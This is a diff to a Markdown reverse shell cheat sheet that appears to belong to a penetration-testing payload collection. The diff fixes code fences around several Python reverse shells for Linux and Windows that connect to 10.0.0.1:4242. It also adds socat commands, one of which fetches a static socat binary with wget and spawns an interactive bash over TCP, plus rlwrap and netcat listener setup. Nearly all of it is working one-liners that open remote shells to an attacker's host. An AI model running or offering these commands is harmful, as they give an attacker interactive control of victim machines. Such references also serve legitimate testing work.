@@ -12,6 +12,7 @@ If you come across any other methods please feel free to contribute to this part
 * [Rust](#rust)
 * [Ruby](#ruby)
 * [Socat](#socat)
+* [NodeJS](#nodejs)
 * [Telnet](#telnet)
 * [War](#war)
 * [Spawn TTY Shell](#spawn-tty-shell)
@@ -267,12 +268,12 @@ export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=sock
 ```
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
-'''
+```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-'''
-'''
+```
+```
 python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-'''
+```
 
 **IPv6**
 ```
@@ -284,9 +285,9 @@ python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 42
 ```
 
 **Windows Only(Python3)**
-'''
+```
 python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
-'''
+```
 
 
 
@@ -322,6 +323,15 @@ fn main() {
 
 ### SoCat
 
+```
+hacker@attack$ socat file:`tty`,raw,echo=0 TCP-L:1337
+hacker@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.x.x:1337
+```
+```
+hacker@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.x.x:1337
+```
+
+
 ### Telnet
 
 ```
@@ -341,3 +351,12 @@ strings reverse.war | grep jsp # in order to get the name of the file
 
 ### Spawn TTY Shell
 
+You need to catch a shell in order to do that you need to setup a listener. There are many ways to do this, for instance rlwrap can help you clear the screen when caught.
+
+```
+rlwrap nc 10.0.0.1 4242
+
+rlwrap -r -f . nc 10.0.0.1 4242
+-f . will make rlwrap use the current history file as a completion word list.
+-r Put all words seen on in- and output on the completion list.
+```
